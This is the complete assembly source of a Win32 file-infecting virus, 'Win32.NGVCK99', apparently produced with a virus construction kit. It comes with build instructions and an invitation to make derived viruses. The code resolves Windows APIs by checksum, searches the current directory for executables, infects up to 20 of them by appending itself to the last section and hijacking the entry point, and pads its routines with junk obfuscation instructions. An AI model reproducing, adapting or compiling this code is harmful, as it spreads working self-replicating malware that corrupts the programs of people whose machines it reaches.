              
;
;
; Win32.NGVCK99 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK99
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 37
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
                                        ; add esp, 4
 add esp, 4d
 mov edx, dword ptr [esp-4]
 sub edx, offset Delta
                                        ; mov ebp, edx
 push edx
 pop ebp
 jmp KernelSearchStart


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear edx
 push 0
 pop edx

 push edx
 push edx
 push 3h
 push edx
                                        ; add edx, 1
 inc edx
 push edx
 push 80000000h or 40000000h
 mov esi, offset WFD_szFileName
 add esi, ebp

 push esi
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], 0
 add dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ebx
 push ebx

                                        ; clear edx
 and edx, 0
 push edx
 push ebx
 push edx
                                        ; mov ecx, 4
 mov ecx, ( 4d xor 31d )
 xor ecx, 31d
 push ecx
 push edx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
                                        ; add eax, 1
 sub eax, -1d
 sub eax, 1
 jz CloseFile
 push ebx
 push 0
 push 0
                                        ; mov eax, 2
 push 2d
 pop eax
 push eax
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 add dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 filemask    db '*.Exe',0
 TempAPI     dd 0h
 KernelPE    dd 0h
 KernelMZ    dd 0h
 FindHandle  dd 0h
 NTableVA    dd 0h
 AlignReg2   dd 0h
 db 'Virus : Win32.NGVCK99 Author : SnakeByte',0
 counter     dw 0h
 AlignReg1   dd 0h
 InfCounter  dd 0h
 MapHandle   dd 0h
 ATableVA    dd 0h
 OTableVA    dd 0h
 MapAddress  dd 0h
 NewSize     dd 0h

 APINames:
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h

 FileHandle  dd 0h
 NewEIP      dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 OldBase     dd 400000h

 APIOffsets:
 XCloseHandle           dd 0h
 XFindFirstFileA        dd 0h
 XFindClose             dd 0h
 XCreateFileMappingA    dd 0h
 XMapViewOfFile         dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileA           dd 0h
 XFindNextFileA         dd 0h

 TempApisearch2 dd 0h
 OldEIP      dd 0h
 Trash1      dd 0h




;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea edx, [ebp+WFD_szFileName]
 xchg edx, esi

                                        ; mov ebx, 276
 push 276d
 pop ebx

ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 inc esi
 dec ebx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov ebx, offset WIN32_FIND_DATA
 add ebx, ebp

 push ebx
                                        ; clear ebx
 and ebx, 0
 add ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]
 xchg ebx, edi

 push ebx
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret





;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; clear ecx
 sub ecx, ecx
 add ecx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear esi
 sub esi, esi
 add esi, [ecx+78h]
 add esi, [ebp+KernelMZ]
                                        ; add esi, 28
 inc esi
 add esi, 27d
                                        ; get ATableVA
 mov ecx, dword ptr [esi]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ecx
                                        ; add esi, 4
 dec esi
 add esi, 5d
                                        ; get NTableVA
 mov ecx, dword ptr [esi]
                                        ; add esi, 4
 add esi, 4d
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ecx
                                        ; get OTableVA
 mov ecx, dword ptr [esi]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ecx
                                        ; number of API's we're looking for
 mov ebx, NumberOfApis

                                        ; load API Names and Offsets
 mov edi, ebp
 add edi, offset APINames

 lea eax, [ebp+APIOffsets]


GetApisLoop: 

                                        ; search 'em
                                        ; edi points to the CRC
                                        ; eax points to the offset
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 call SearchAPI1
                                        ; add edi, 4
 inc edi
 add edi, 3d
 push dword ptr [ebp+TempAPI]
 pop edx
 mov dword ptr [eax], edx
                                        ; add eax, 4
 add eax, 4d
 sub ebx, 1
 jnz GetApisLoop
 mov esi, offset Outbreak
 add esi, ebp

 push esi
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; mov eax, -1
 mov eax, ( -1d + 5d )
 sub eax, 5d
 and eax, dword ptr [ebp+OldEIP]

 push eax
 pop dword ptr [ebp+retEIP]

 push dword ptr [ebp+OldBase]
 pop edi

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], edi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 sub ebp, -1d
 sub ebp, 1
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 push ebx
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop ebx
                                        ; retrieve PE - Header
 mov ecx, ebx
 add ecx, [ebx+3Ch]
                                        ; get File Alignment
                                        ; add ecx, 60
 add ecx, 60d
 mov ebx, [ecx]
                                        ; mov edx, 60
 mov edx, ( 60d xor 15d )
 xor edx, 15d
 sub ecx, edx
                                        ; clear eax
 and eax, 0
 add eax, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], eax
 call Align
                                        ; clear eax
 and eax, 0
 xor eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 xor dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 xor dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ecx, esi
 add ecx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 push ecx
 pop esi
                                        ; get last section
 movzx eax, word ptr [esi+06h]
 add eax, -1
 imul eax, eax, 28h
                                        ; add ecx, 120
 dec ecx
 add ecx, 121d
 add ecx, eax
                                        ; clear edx
 and edx, 0
 add edx, dword ptr [esi+74h]
 clc
 rcl edx, 3
 add ecx, edx
                                        ; get old Entrypoint
 mov edx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 add dword ptr [ebp+OldBase], edx
 mov edx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], edx
 mov ebx, [ecx+10h]
                                        ; mov eax, ebx
                                        ; clear eax
 push 0
 pop eax
 add eax, ebx
 add ecx, 14h
 add ebx, [ecx]
 sub ecx, 14h
 push ebx
 push eax
 pop edx
 add edx, [ecx+0Ch]
 push edx
 pop dword ptr [ebp+NewEIP]
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], edx
                                        ; clear edx
 sub edx, edx

 add edx, [ecx+10h]
 push edx
                                        ; calculate new section size
 push dword ptr [esi+3Ch]
 add edx, VirusSize
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], edx
 call Align
 push dword ptr [ebp+AlignReg1]
 pop edx
 mov dword ptr [ecx+10h], edx
 pop edx
 add edx,  (VirusSize-1724d)
 add edx, 1724d
 mov dword ptr [ecx+08h], 0
 add dword ptr [ecx+08h], edx
 mov edx, dword ptr [ecx+10h]
 add edx, dword ptr [ecx+0Ch]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], edx
                                        ; set write, read and code flag
 or dword ptr [ecx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 lea eax, [ebp+Virus]
 xchg eax, esi

 mov ebx, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 add dword ptr [ebp+Trash1], 1874074    ; Trash
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; mov eax, -1
 push -1d
 pop eax
 and eax, dword ptr [ebp+InfCounter]
 sub eax, 1
 mov dword ptr [ebp+InfCounter], 0
 add dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 stc
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, -45107d
 add edx, 45107d
 mov eax, dword ptr [ebp+AlignReg1]
 push eax
 div ebx
 sub ebx, edx
 pop eax
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov edi, dword ptr [esp]
                                        ; round to pages
 ror edi, 16d
 shl edi, 16d
                                        ; add edi, 1
 sub edi, -1d
GetKernelLoop:
                                        ; clear eax
 mov eax, 63302d
 sub eax, 63302d
 dec edi
 mov ax, word ptr [edi+03ch]
 cmp ax,0f800h
 je GetKernelLoop
 cmp edi, dword ptr [edi+eax+34h]
 jnz GetKernelLoop
 push edi
 pop dword ptr [ebp+KernelMZ]
 mov eax, [edi+3Ch]
 add eax, edi
 mov [KernelPE+ebp], eax

 lea eax, [ebp+GetApis]
 xchg esi, eax

 push esi
ret

;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
 xor ebx, ebx                           ; Trash




                                        ; mov eax, -1
 push -1d
 pop eax
 and eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 mov edx, dword ptr [ebp+KernelMZ]
 add edx, dword ptr [eax]
                                        ; mov eax, edx
 mov eax, edx
                                        ; mov ecx, edx
 push edx
 pop ecx
 mov dword ptr [ebp+TempApisearch2], 0
 and ebx, eax                           ; Trash
 xor dword ptr [ebp+TempApisearch2], ecx
 push edi
 cld

                                        ; ecx Points to API-Name ( Kernel )
                                        ; edi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
 push dword ptr [edi]
 pop ebx
 LoopChsksm:
                                        ; clear edx
 push 0
 pop edx
 mov dl, byte ptr [ecx]
                                        ; add ecx, 1
 inc ecx
 shl dx,8d
 sub ebx, edx
 cmp dx, 0
 je LoopConti
                                        ; clear edx
 mov edx, -38666d
 add edx, 38666d
 mov dl, byte ptr [ecx]
                                        ; add ecx, 1
 add ecx, 1d
 sub ebx, edx
 cmp dx, 0
 jne LoopChsksm
LoopConti:
 cmp ebx, 0
 je FoundApi1

ApiNotFound:                            ; we did not find it :(
 mov dword ptr [ebp+Trash1], 185885     ; Trash
 pop edi
 pop eax
                                        ; clear ecx
 xor ecx, ecx
 add ecx, dword ptr [ebp+TempApisearch2]
                                        ; add eax, 4
 add eax, 4d
 add word ptr [ebp+counter], 1h
 add dword ptr [ebp+Trash1], 113227     ; Trash
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop eax
 add esp, 4h
                                        ; retrieve the offset
                                        ; clear eax
 mov eax, -54331d
 add eax, 54331d
 mov ax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 xchg eax, ebx
                                        ; clear eax
 and eax, 0
 mov ax, word ptr [ebx]
 shl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 push dword ptr [ebp+KernelMZ]
 pop ecx
 add ecx, dword ptr [eax]
 mov dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
                                        ; clear eax
 push 0
 pop eax
 xor eax, dword ptr [ebp+WFD_nFileSizeLow]
 cmp eax, 20000d
 jbe NoInfection
 adc edx, ecx                           ; Trash
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear ebx
 sub ebx, ebx
 add ebx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ebx], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [ebx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 mov ecx, dword ptr [ebx+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ecx
 jb Notagoodfile
 add ecx, ebx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ecx], 'EP'
 je Goodfile2
 mov edx, ebx                           ; Trash
                                        ; mov edx, 48894
 push 48894d
 pop edx
 cmp edx, 48894d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov dx, word ptr [ecx+16h]
 and dx, 0F000h
 cmp dx, 02000h
 je Notagoodfile
                                        ; check for OBJ
 mov ax, word ptr [ecx+16h]
 and ax, 00002h
 cmp ax, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], edi

                                        ; mov esi, -1
 push -1d
 pop esi
 and esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], esi




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea edi, [ebp+filemask]
 xchg edi, eax

                                        ; Set Infection Counter
 mov [ebp+InfCounter], 20d
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 pop esi
 push esi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

